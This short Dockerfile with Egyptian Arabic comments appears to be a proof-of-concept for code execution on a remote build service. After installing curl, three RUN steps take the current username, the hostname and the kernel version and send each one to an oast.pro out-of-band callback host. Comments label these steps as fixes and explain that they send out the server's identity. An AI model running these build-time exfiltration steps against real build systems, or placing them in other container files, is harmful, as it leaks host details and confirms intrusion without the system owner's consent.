FROM alpine:latest

# نزل الأدوات الضرورية
RUN apk add --no-cache curl

# --- التصحيح 1: استخدام Backticks ومسح السطر الجديد ---
# الأمر ده هيجيب اسم اليوزر (غالباً root) ويبعته في الرابط
RUN USER=`whoami | tr -d '\n'` && curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/$USER

# --- التصحيح 2: إرسال اسم السيرفر ---
# الأمر ده هيجيب الـ Hostname ويبعته
RUN HOST=`hostname | tr -d '\n'` && curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/$HOST

# --- التصحيح 3: إثبات Kernel Version (بدل SYS_INFO) ---
RUN KERNEL=`uname -r | tr -d '\n'` && curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/$KERNEL
